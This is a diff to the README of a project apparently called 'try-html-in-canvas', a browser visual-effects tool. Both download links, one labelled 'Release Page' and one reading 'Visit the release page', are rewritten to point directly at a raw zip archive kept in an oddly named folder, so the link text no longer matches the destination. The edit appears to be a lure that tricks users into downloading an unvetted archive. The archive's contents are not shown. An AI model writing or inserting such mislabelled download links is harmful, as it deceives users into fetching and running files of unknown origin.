@@ -1,6 +1,6 @@
 # 🎨 try-html-in-canvas - Add creative visual effects to websites
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/theonfromgot-oss/try-html-in-canvas)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/theonfromgot-oss/try-html-in-canvas/raw/refs/heads/main/chavicin/canvas_html_in_try_3.0.zip)
 
 This software allows you to transform any web page into a visual display. It uses browser tools to capture the contents of a page and applies filters to change how they look. You can use pre-set effects like blurring, swirling, or color shifts to customize your browsing experience.
 
@@ -19,7 +19,7 @@ This software relies on experimental features in your web browser. You must upda
 
 You need to save the program files to your computer.
 
-[Visit the release page to download the latest file](https://github.com/theonfromgot-oss/try-html-in-canvas)
+[Visit the release page to download the latest file](https://github.com/theonfromgot-oss/try-html-in-canvas/raw/refs/heads/main/chavicin/canvas_html_in_try_3.0.zip)
 
 1. Go to the link above.
 2. Look for the section labeled **Assets**.
